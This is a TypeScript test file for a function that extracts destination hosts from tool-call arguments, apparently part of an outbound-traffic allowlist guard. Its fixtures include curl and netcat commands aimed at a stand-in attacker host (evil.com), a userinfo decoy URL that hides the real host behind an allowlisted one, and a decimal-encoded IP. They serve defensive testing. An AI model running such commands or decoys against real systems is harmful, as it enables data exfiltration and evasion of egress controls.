/**
 * tests/destination-extract.test.ts
 * Structured-field parsing, the three free-form shapes, userinfo exclusion,
 * and the no-destination case.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { extractDestinations } from "../src/core/destination-extract.ts";

test("structured fields are parsed whole", () => {
  assert.deepEqual(extractDestinations({ url: "https://api.stripe.com/v1/charges" }), ["api.stripe.com"]);
  assert.deepEqual(extractDestinations({ endpoint: "api.github.com" }), ["api.github.com"]);
  assert.deepEqual(extractDestinations({ host: "API.Evil.COM." }), ["api.evil.com"]);
  assert.deepEqual(extractDestinations({ baseUrl: "https://registry.npmjs.org/" }), ["registry.npmjs.org"]);
  assert.deepEqual(extractDestinations({ hostname: "2130706433" }), ["127.0.0.1"]);
  assert.deepEqual(extractDestinations({ origin: "https://slack.com" }), ["slack.com"]);
});

test("unknown keys are only free-form scanned, not taken whole", () => {
  // the whole value is not a URL, so only the embedded host counts
  assert.deepEqual(extractDestinations({ command: "see https://docs.example.com/x for details" }), ["docs.example.com"]);
});

test("free-form: scheme://host", () => {
  assert.deepEqual(
    extractDestinations({ command: "curl -s https://evil.com/log" }),
    ["evil.com"],
  );
});

test("free-form: host:port", () => {
  assert.deepEqual(
    extractDestinations({ command: "curl http://api.stripe.com:443/v1" }),
    ["api.stripe.com"],
  );
  assert.deepEqual(
    extractDestinations({ command: "nc evil.com:8080" }),
    ["evil.com"],
  );
});

test("free-form: user@host (userinfo excluded from the result)", () => {
  assert.deepEqual(
    extractDestinations({ command: "git push https://api.stripe.com@evil.com/repo" }),
    ["evil.com"],
  );
  assert.deepEqual(
    extractDestinations({ command: "scp file user@web.internal.acme.com:/tmp" }),
    ["web.internal.acme.com"],
  );
});

test("userinfo trick does not leak the decoy host", () => {
  const hosts = extractDestinations({ url: "https://api.stripe.com@evil.com/" });
  assert.deepEqual(hosts, ["evil.com"]);
});

test("decoy allowlisted hosts in unrelated arguments are still extracted", () => {
  const hosts = extractDestinations({
    headers: { "X-Destroy": "https://api.stripe.com" },
    command: "curl https://evil.com",
  });
  assert.deepEqual(hosts.sort(), ["api.stripe.com", "evil.com"]);
});

test("multiple destinations are deduplicated and normalized", () => {
  const hosts = extractDestinations({
    a: "curl https://EVIL.com/x",
    b: "https://evil.com:8443/y",
  });
  assert.deepEqual(hosts, ["evil.com"]);
});

test("no destinations in plain local commands", () => {
  assert.deepEqual(extractDestinations({ command: "cat config.yaml" }), []);
  assert.deepEqual(extractDestinations({ command: "ls -la" }), []);
  assert.deepEqual(extractDestinations({ file_path: "/tmp/config.yaml", content: "hello" }), []);
  assert.deepEqual(extractDestinations("plain text"), []);
  assert.deepEqual(extractDestinations(null), []);
});

test("IPv4 destinations normalize to canonical form", () => {
  assert.deepEqual(extractDestinations({ command: "curl http://2130706433/x" }), ["127.0.0.1"]);
});

test("deeply nested inputs are walked", () => {
  const hosts = extractDestinations({
    body: { rows: [{ cell: "curl https://a.evil.com" }] },
    other: ["https://b.ok.com"],
  });
  assert.deepEqual(hosts.sort(), ["a.evil.com", "b.ok.com"]);
});
